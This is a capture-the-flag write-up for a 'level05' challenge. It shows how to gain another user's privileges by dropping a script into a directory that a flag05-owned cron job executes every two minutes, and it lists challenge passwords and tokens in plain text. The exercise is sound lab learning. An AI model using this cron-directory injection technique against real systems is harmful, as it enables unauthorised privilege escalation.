# Level05 - Flag05

## Local script usage

```shell
Usage: ./main.sh
```

## Passwords and token

|         |                             |
| ------- | --------------------------- |
| level05 | `ne2searoevaevoem4ov4ar8ap` |
| flag05  |                             |
| token   | `viuaaale9huek52boumoomioc` |

## Steps to resolve on VM

1. Connect to `level05` user and notice there is a new mail

```bash
su level04
# Enter the token
> You have new mail.
```

2. Check the mail

```bash
cat /var/mail/level05
> */2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
# We can notice that we have a cron job schedule
# Every 2 minutes, it will execute a script at '/usr/sbin/openarenaserver' with flag05 user
```

3. Check the cron job

```bash
# By listing this script we notice the '+' permission, which means 'extended permissions"
ls -l /usr/sbin/openarenaserver
> -rwxr-x---+ 1 flag05 flag05 94 Mar  5  2016 /usr/sbin/openarenaserver

# Indeed, we can check that it has the same permissions from flag05 user
getfacl /usr/sbin/openarenaserver
> getfacl: Removing leading '/' from absolute path names
> # file: usr/sbin/openarenaserver
> # owner: flag05
> # group: flag05
> user::rwx
> user:level05:r--
> group::r-x
> mask::r-x
> other::---

cat /usr/sbin/openarenaserver
> #!/bin/sh
>
> for i in /opt/openarenaserver/* ; do
>        (ulimit -t 5; bash -x "$i")
>        rm -f "$i"
> done
# This script is going to execute everyscripts inside /opt/openarenaserver/
# And then delete it

```

4. Prepare the script to be launched with crontab and get the flag05

```bash
# First add the cron job into crontab
(crontab -l ; cat /var/mail/level05)| crontab -

# Then create the script in the cron job scripts location
echo "getflag > /tmp/flag05" > /opt/openarenaserver/script
chmod +x /opt/openarenaserver/script

# Then display the output after 2 minutes because of the cron job schedule
sleep 2m && cat /tmp/flag05
> [1]-  Done                    sleep 2m
> Check flag.Here is your token : viuaaale9huek52boumoomioc
```

---

## Sources

### SHELL

- [Cron editor](https://crontab.guru/#*/2_*_*_*_*)
- [Crontab intro](https://www.linuxtricks.fr/wiki/cron-et-crontab-le-planificateur-de-taches)
- [Crontab add job](https://stackoverflow.com/questions/8579330/appending-to-crontab-with-a-shell-script-on-ubuntu)
- [ulimit](https://linuxhint.com/linux_ulimit_command/)
- ['+' at the end of permissions](https://serverfault.com/questions/227852/what-does-a-mean-at-the-end-of-the-permissions-from-ls-l)